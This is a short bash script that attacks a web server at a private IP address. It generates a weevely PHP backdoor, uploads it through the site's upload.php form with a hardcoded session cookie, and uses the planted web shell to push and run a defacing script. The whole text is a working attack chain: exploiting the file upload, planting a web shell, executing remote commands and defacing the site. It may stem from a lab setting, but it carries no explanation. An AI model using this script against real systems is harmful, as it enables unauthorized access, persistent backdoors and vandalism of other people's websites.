URL="http://192.168.0.13"
TARGET="$URL/upload.php"

echo "Generating weevely backdoor named hello.php with password foo..."
weevely generate foo hello.php
echo "Payload done."



echo "Uploading backdoor..."

result=$(curl --location --request POST $TARGET \
--header 'Cookie: PHPSESSID=a1fea7e35902910b546d9e9449d1d662' \
--form 'uploadedFile=@hello.php' \
--form 'uploadBtn=Upload')


if [[ $result == *"File was successfully uploaded"* ]]; then
  echo "upload OK."
  uploadedfile=$(echo $result | egrep -o 'File was successfully uploaded to .+.php' | cut -d "/" -f5)
  payload=$(cat defacing.sh)
  weevely $URL/uploaded_files/$uploadedfile foo "file_upload ./defacing.sh ./script.sh"
  weevely $URL/uploaded_files/$uploadedfile foo "bash ./script.sh"

else
  echo "Couldn't upload file to web target."
fi
